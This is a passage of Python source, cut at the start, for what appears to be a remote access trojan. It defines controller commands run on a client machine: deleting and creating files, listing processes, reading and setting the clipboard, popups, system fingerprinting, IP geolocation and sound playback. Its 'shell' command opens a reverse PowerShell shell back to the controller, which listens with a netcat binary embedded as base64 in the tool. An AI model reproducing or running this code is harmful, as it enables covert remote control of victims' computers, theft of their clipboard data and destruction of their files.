    "Deletes a file on the client",
    [ArgumentType.string],
    EmptyReturn,
)
class DeleteFile(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import os

        try:
            path = sock.recv(int.from_bytes(sock.recv(8)))
        except OSError:
            return

        try:
            os.remove(path)
        except PermissionError:
            status = "p"
        except FileNotFoundError:
            status = "d"
        except OSError:
            status = "n"
        else:
            status = "y"

        if os.path.isdir(path):
            status = "f"

        try:
            sock.sendall(status.encode())
        except OSError:
            return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        try:
            path = params[0].encode()
            client.socket.sendall(len(path).to_bytes(8))
            client.socket.sendall(path)
        except OSError:
            print("Failed to send path to client")
            return CommandResult(DoubleCommandResult.failure)

        try:
            status = client.socket.recv(1).decode(errors="ignore")
        except OSError:
            print("Sent path, but client did not respond with a success indicator")
            return CommandResult(DoubleCommandResult.semi_success)

        match status:
            case "n":
                print("There was an error when deleting the file")
                return CommandResult(DoubleCommandResult.failure)
            case "d":
                print("Directory doesn't exist")
                return CommandResult(DoubleCommandResult.failure)
            case "p":
                print("The client does not have permission to remove such file")
                return CommandResult(DoubleCommandResult.failure)
            case "f":
                print("That path is a directory")
                return CommandResult(DoubleCommandResult.failure)
            case "y":
                print("Successfully deleted file")
                return CommandResult(DoubleCommandResult.success)
            case _:
                print(
                    "Sent path, but client did not respond with a valid success indicator"
                )
                return CommandResult(DoubleCommandResult.semi_success)


@add_double_command(
    "touch",
    "touch [ file path ]",
    "Creates a file on the client",
    [ArgumentType.string],
    EmptyReturn,
)
class MakeFile(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import os.path

        try:
            path = sock.recv(int.from_bytes(sock.recv(8))).decode(errors="ignore")
        except OSError:
            return

        try:
            if os.path.exists(path):
                raise FileExistsError("file already exists")
            open(path, "wb").close()
        except PermissionError:
            status = b"p"
        except FileExistsError:
            status = b"f"
        except FileNotFoundError:
            status = b"d"
        except OSError:
            status = b"n"
        else:
            status = b"y"

        try:
            sock.sendall(status)
        except OSError:
            return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        try:
            path = params[0].encode()
            client.socket.sendall(len(path).to_bytes(8))
            client.socket.sendall(path)
        except OSError:
            print("Failed to send path to client")
            return CommandResult(DoubleCommandResult.failure)

        try:
            status = client.socket.recv(1).decode(errors="ignore")
        except OSError:
            print("Sent path, but client did not respond with a success indicator")
            return CommandResult(DoubleCommandResult.semi_success)

        match status:
            case "n":
                print("There was an error when creating the file")
                return CommandResult(DoubleCommandResult.failure)
            case "f":
                print("File already exists")
                return CommandResult(DoubleCommandResult.failure)
            case "d":
                print("Parent directory doesn't exist")
                return CommandResult(DoubleCommandResult.failure)
            case "p":
                print("The client does not have permission to create such file")
                return CommandResult(DoubleCommandResult.failure)
            case "y":
                print("Successfully created file")
                return CommandResult(DoubleCommandResult.success)
            case _:
                print(
                    "Sent path, but client did not respond with a valid success indicator"
                )
                return CommandResult(DoubleCommandResult.semi_success)


@add_double_command(
    "list_procs",
    "list_procs",
    "Lists processes running on the client",
    [],
    list[tuple[int, str]],
    required_client_modules=["psutil"],
)
class ListProcesses(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> EmptyReturn:
        import psutil

        for proc in psutil.process_iter(["pid", "name"]):
            try:
                if proc.pid == 0:
                    continue
                sock.sendall(proc.pid.to_bytes(4))

                proc_name = proc.name().encode()
                sock.sendall(len(proc_name).to_bytes(2))
                sock.sendall(proc_name)
            except psutil.Error:
                continue
            except OSError:
                return
        try:
            sock.sendall(int(0).to_bytes(4))
        except OSError:
            return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        procs = []
        while True:
            try:
                pid = int.from_bytes(client.socket.recv(4))
                if pid == 0:
                    break
                proc_name = client.socket.recv(
                    int.from_bytes(client.socket.recv(2))
                ).decode(errors="ignore")

                print(f"{pid} {'-' * (11 - len(str(pid)))}> {proc_name}")
                procs.append((pid, proc_name))
            except (OSError, MemoryError):
                break

        return CommandResult(DoubleCommandResult.success, procs)


@add_double_command(
    "chdir",
    "chdir [ path ]",
    "Changes the working directory on the client",
    [ArgumentType.string],
    EmptyReturn,
)
class ChangeCWD(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import os

        try:
            path = sock.recv(int.from_bytes(sock.recv(2)))
        except OSError:
            return

        try:
            os.chdir(path)
        except PermissionError:
            status = b"p"
        except FileNotFoundError:
            status = b"f"
        except OSError:
            status = b"n"
        else:
            status = b"y"

        try:
            sock.sendall(status)
        except OSError:
            return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        try:
            path = params[0].encode()
            client.socket.sendall(len(path).to_bytes(2))
            client.socket.sendall(path)
        except OSError:
            print("Error sending path to client")
            return CommandResult(DoubleCommandResult.conn_error)

        try:
            success_indicator = client.socket.recv(1).decode(errors="ignore")
        except OSError:
            print("Sent path but client did not respond with a success indicator")
            return CommandResult(DoubleCommandResult.semi_success)

        match success_indicator:
            case "y":
                print("Successfully changed working directory")
                return CommandResult(DoubleCommandResult.success)
            case "n":
                print("Client says that the working directory is invalid")
                return CommandResult(DoubleCommandResult.failure)
            case "f":
                print("Directory not found on client")
                return CommandResult(DoubleCommandResult.failure)
            case "p":
                print("Client does not have permission to enter such directory")
                return CommandResult(DoubleCommandResult.failure)
            case _:
                print(
                    "Sent path but client did not respond with a valid success indicator"
                )
                return CommandResult(DoubleCommandResult.failure)


@add_double_command(
    "clipboard_set",
    "clipboard_set [ string to set ]",
    "Sets the clipboard value on the client",
    [ArgumentType.string],
    EmptyReturn,
    required_client_modules=["pyperclip"],
)
class SetClipboard(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import pyperclip

        try:
            value = sock.recv(int.from_bytes(sock.recv(2))).decode()
        except OSError:
            return

        pyperclip.copy(value)

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        try:
            value = params[0].encode()
            client.socket.sendall(len(value).to_bytes(2))
            client.socket.sendall(value)
        except OSError:
            print("Failed whilst sending string to client")
            return CommandResult(DoubleCommandResult.conn_error)

        print("Asked client to copy string")
        return CommandResult(DoubleCommandResult.success)


@add_double_command(
    "clipboard_get",
    "clipboard_get",
    "Gets the clipboard value on the client",
    [],
    str,
    required_client_modules=["pyperclip"],
)
class GetClipboard(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import pyperclip

        try:
            value = pyperclip.paste().encode()
            sock.sendall(len(value).to_bytes(2))
            sock.sendall(value)
        except OSError:
            return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        try:
            value = client.socket.recv(int.from_bytes(client.socket.recv(2))).decode()
        except OSError:
            print("Failed whilst recieving string from client")
            return CommandResult(DoubleCommandResult.conn_error)

        print(f"Client clipboard: {value}")
        return CommandResult(DoubleCommandResult.success, value)


@add_double_command(
    "popup",
    "popup [ title ] [ message ]",
    "Displays a popup message on the clients screen",
    [ArgumentType.string, ArgumentType.string],
    EmptyReturn,
)
class Popup(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> EmptyReturn:
        import threading
        import ctypes

        try:
            title = sock.recv(int.from_bytes(sock.recv(2))).decode(errors="ignore")
            message = sock.recv(int.from_bytes(sock.recv(2))).decode(errors="ignore")
        except OSError:
            return

        try:
            threading.Thread(
                target=lambda: ctypes.windll.user32.MessageBoxW(
                    0, message, title, 0x40
                ),
                name="Popup",
            ).start()
        except Exception:
            status = "n"
        else:
            status = "y"

        try:
            sock.sendall(status.encode())
        except OSError:
            return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        try:
            title = params[0].encode()
            msg = params[1].encode()
            client.socket.sendall(len(title).to_bytes(2))
            client.socket.sendall(title)
            client.socket.sendall(len(msg).to_bytes(2))
            client.socket.sendall(msg)
        except OSError:
            print("Failed to send message to client")
            return CommandResult(DoubleCommandResult.conn_error)

        try:
            success_indicator = client.socket.recv(1).decode(errors="ignore")
        except OSError:
            print("Sent message, but client did not respond with a success indicator")
            return CommandResult(DoubleCommandResult.semi_success)

        match success_indicator:
            case "y":
                print("Successfully displayed popup")
                return CommandResult(DoubleCommandResult.success)
            case "n":
                print("Failed to display popup")
                return CommandResult(DoubleCommandResult.failure)
            case _:
                print(
                    "Sent message, but client did not respond with a valid success indicator"
                )
                return CommandResult(DoubleCommandResult.semi_success)


@add_double_command(
    "sysinfo",
    "sysinfo",
    "Gathers information about the client computer",
    [],
    dict[str, str | int],
)
class GatherSystemInformation(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> EmptyReturn:
        import platform
        import os

        def send_item(item: str | int) -> None:
            if isinstance(item, str):
                encoded = item.encode()
                sock.sendall(len(encoded).to_bytes(4))
                sock.sendall(encoded)
            elif isinstance(item, int):
                sock.sendall(item.to_bytes(8))

        send_item(os.cpu_count())  # type: ignore
        send_item(platform.architecture()[0])
        send_item(platform.machine())
        send_item(platform.node())
        send_item(platform.system())
        send_item(platform.platform())

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        def recieve_item(item_type: type) -> str | int:
            if item_type is str:
                return client.socket.recv(int.from_bytes(client.socket.recv(4))).decode(
                    "utf-8"
                )
            else:
                return int.from_bytes(client.socket.recv(8))

        output = {}
        try:
            output["CPU count"] = recieve_item(int)
            output["Architecture"] = recieve_item(str)
            output["Machine type"] = recieve_item(str)
            output["Network name"] = recieve_item(str)
            output["System name"] = recieve_item(str)
            output["System version"] = recieve_item(str)
        except OSError:
            print("Failed to recieve information")
            return CommandResult(DoubleCommandResult.conn_error)

        for key, value in output.items():
            print(f"{key}{' ' * (14 - len(key))} -> {value}")
        return CommandResult(DoubleCommandResult.success, output)


@add_double_command(
    "ipinfo",
    "ipinfo [ api key for ipinfo.io ]",
    "Gets information about the client IP",
    [ArgumentType.string],
    dict,
    required_server_modules=["ipinfo"],
)
class Geolocate(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import urllib.request

        try:
            sock.sendall(urllib.request.urlopen("https://api.ipify.org").read())
        except OSError:
            return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        from typing import Any
        import ipinfo

        def indent_print(item: dict[str, Any], indent: int = 0) -> None:
            longest_key_len = max([len(key) for key in item])
            for key, value in item.items():
                if isinstance(value, dict):
                    print(
                        f"{' ' * indent}{key.title().replace('_', ' ')} {'-' * ((longest_key_len + 6) - len(key))}>"
                    )
                    indent_print(value, indent + 4)
                else:
                    print(
                        f"{' ' * indent}{key.title().replace('_', ' ')} {'-' * ((longest_key_len + 1) - len(key))}> {value}"
                    )

        try:
            target_ip = client.socket.recv(39).decode(
                "utf-8"
            )  # 39 characters for an IPv6 address
        except OSError:
            print("Failed to recieve client ip, defaulting to stored one.")
            target_ip = client.ip

        handler = ipinfo.getHandler(params[0])
        info = handler.getDetails(target_ip)

        indent_print(info.all)

        return CommandResult(DoubleCommandResult.success, info.all)


@add_double_command(
    "shell",
    "shell",
    "Runs and interactive shell on the client",
    [],
    EmptyReturn,
    no_new_process=True,
    no_multitask=True,
    max_selected=1,
)
class Shell(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        # shell structure from revshells.com
        import subprocess
        import threading
        import socket

        def server_to_peer(
            sock: socket.socket, process: subprocess.Popen, running: dict[str, bool]
        ) -> None:
            while running["running"]:
                try:
                    data = sock.recv(1024)
                except TimeoutError:
                    continue
                except OSError:
                    return
                if len(data) > 0:
                    process.stdin.write(data)  # type: ignore
                    process.stdin.flush()  # type: ignore

        def peer_to_server(
            sock: socket.socket, process: subprocess.Popen, running: dict[str, bool]
        ) -> None:
            while running["running"]:
                try:
                    sock.send(process.stdout.read(1))  # type: ignore
                except OSError:
                    return

        powershell_process = subprocess.Popen(
            ["powershell"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            stdin=subprocess.PIPE,
        )

        try:
            shell_sock = socket.socket()
            shell_sock.setblocking(True)
            shell_sock.settimeout(5)
            shell_sock.connect((sock.getpeername()[0], int.from_bytes(sock.recv(4))))
        except OSError:
            return

        running = {"running": True}
        s2p_thread = threading.Thread(
            target=server_to_peer, args=[shell_sock, powershell_process, running]
        )
        s2p_thread.daemon = True
        s2p_thread.start()

        p2s_thread = threading.Thread(
            target=peer_to_server, args=[shell_sock, powershell_process, running]
        )
        p2s_thread.daemon = True
        p2s_thread.start()

        powershell_process.wait()
        running["running"] = False
        shell_sock.close()

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        from shared.command_consts import NETCAT_B64_ZLIB_EXE
        import subprocess
        import socket
        import base64
        import zlib
        import os

        def find_random_port() -> int:
            sock = socket.socket()
            sock.bind(("localhost", 0))
            _, port = sock.getsockname()
            sock.close()
            return port

        def bail(msg: str) -> None:
            print(msg)
            os.remove(temp_file)

        temp_file = f"{os.getenv('TEMP')}/nc.exe"
        with open(temp_file, "wb") as netcat_exe:
            netcat_exe.write(zlib.decompress(base64.b64decode(NETCAT_B64_ZLIB_EXE)))

        port = find_random_port()
        try:
            client.socket.sendall(port.to_bytes(4))
        except OSError:
            bail("Failed to send port to client")
            return CommandResult(DoubleCommandResult.conn_error)

        subprocess.Popen(
            [temp_file, "-lp", str(port)],
            shell=True,
        ).wait()
        bail("Connection terminated")

        return CommandResult(DoubleCommandResult.success)


@add_double_command(
    "playsound",
    "playsound [ local file path ]",
    "Plays a sound file on the client",
    [ArgumentType.string],
    EmptyReturn,
    required_client_modules=["pyglet"],
)
class PlaySound(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import threading
        import pyglet
        import os

        def play_sound(path: str) -> None:
            def on_player_eos() -> None:
                pyglet.app.exit()

            player = pyglet.media.Player()
            source = pyglet.media.StaticSource(pyglet.media.load(path))
            player.queue(source)
            player.play()
            player.push_handlers(on_player_eos)
            pyglet.app.run()

        try:
            sound_contents = sock.recv(int.from_bytes(sock.recv(4)))
            if sound_contents == b"EXIT":
                return
            sound_format = sock.recv(int.from_bytes(sock.recv(2)))
        except OSError:
            return

        sound_file = f"{os.getenv('TEMP')}/sound.{sound_format}"
        with open(sound_file, "wb") as sound_file_fd:
            sound_file_fd.write(sound_contents)

        threading.Thread(
            target=play_sound, args=[sound_file], name="Play sound Thread"
        ).start()

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        import os

        def bail(display_msg: str, bail_client: bool) -> None:
            print(display_msg)
            if bail_client:
                try:
                    client.socket.sendall(int(4).to_bytes(4))
                    client.socket.sendall(b"EXIT")
                except OSError:
                    pass

        try:
            with open(params[0], "rb") as sound_file_fd:
                sound_contents = sound_file_fd.read()
        except FileNotFoundError:
            bail(f"File '{params[0]}' not found", True)
            return CommandResult(DoubleCommandResult.param_error)
        sound_format = os.path.splitext(params[0])[1].encode()
        try:
            client.socket.sendall(len(sound_contents).to_bytes(4))
            client.socket.sendall(sound_contents)
            client.socket.sendall(len(sound_format).to_bytes(2))
            client.socket.sendall(sound_format)
        except OSError:
            bail("Failed whilst sending sound to client", False)
            return CommandResult(DoubleCommandResult.conn_error)

        print("Played sound on client")
        return CommandResult(DoubleCommandResult.success)
